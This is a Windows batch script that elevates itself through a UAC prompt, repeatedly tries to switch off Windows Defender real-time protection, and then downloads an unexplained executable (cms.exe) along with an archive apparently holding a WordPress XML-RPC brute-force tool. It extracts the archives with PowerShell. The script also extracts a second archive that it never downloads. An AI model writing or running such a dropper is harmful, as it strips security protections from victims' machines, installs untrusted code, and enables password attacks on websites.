@echo off
:: Self-elevating batch script to disable Windows Defender real-time protection and download/extract zip files with UAC prompt

:: Get the directory of the script
set "scriptDir=%~dp0"
timeout /t 1 >nul

:: Check if running as Administrator
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Requesting administrative privileges...
    timeout /t 1 >nul
    powershell -Command "Start-Process -FilePath '%~f0' -Verb runAs"
    exit /b
)

echo Running with administrative privileges.
timeout /t 1 >nul

:: Retry mechanism for disabling Windows Defender
set "maxRetries=5"
set "retryCount=0"
:retryDisable
echo Disabling Windows Defender Real-time Protection...
timeout /t 1 >nul
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
if %errorlevel% equ 0 (
    echo Windows Defender real-time protection has been disabled successfully.
    timeout /t 1 >nul
) else (
    set /a retryCount+=1
    echo Failed to disable Windows Defender real-time protection. Attempt %retryCount% of %maxRetries%.
    timeout /t 1 >nul
    if %retryCount% lss %maxRetries% (
        timeout /t 5 /nobreak >nul
        goto retryDisable
    ) else (
        echo Maximum retry attempts reached. Exiting script.
        timeout /t 1 >nul
        exit /b
    )
)

echo.
echo Downloading and extracting archives...
timeout /t 1 >nul

:: Create directories for each zip file
set "bruteDir=%scriptDir%Brute_XML-RPC_WP"
set "dcDir=%scriptDir%DC_XMLRPC"
timeout /t 1 >nul

mkdir "%bruteDir%"
timeout /t 1 >nul
mkdir "%dcDir%"
timeout /t 1 >nul

:: Use PowerShell to download and extract the archives in one line
powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest 'https://raw.githubusercontent.com/aditvpsauto/shellbro/main/Brute_XML-RPC_WP.zip' -OutFile '%scriptDir%Brute_XML-RPC_WP.zip'; Invoke-WebRequest 'https://github.com/filzauploa/fileuupll/raw/refs/heads/main/cms.exe' -OutFile '%scriptDir%cms.exe'; Expand-Archive '%scriptDir%Brute_XML-RPC_WP.zip' -DestinationPath '%bruteDir%' -Force; Expand-Archive '%scriptDir%DC_XMLRPC.zip' -DestinationPath '%dcDir%' -Force"
timeout /t 1 >nul

if %errorlevel% equ 0 (
    echo Archives downloaded and extracted successfully.
) else (
    echo Failed to download or extract archives. Please check your internet connection and permissions.
)
timeout /t 1 >nul

pause
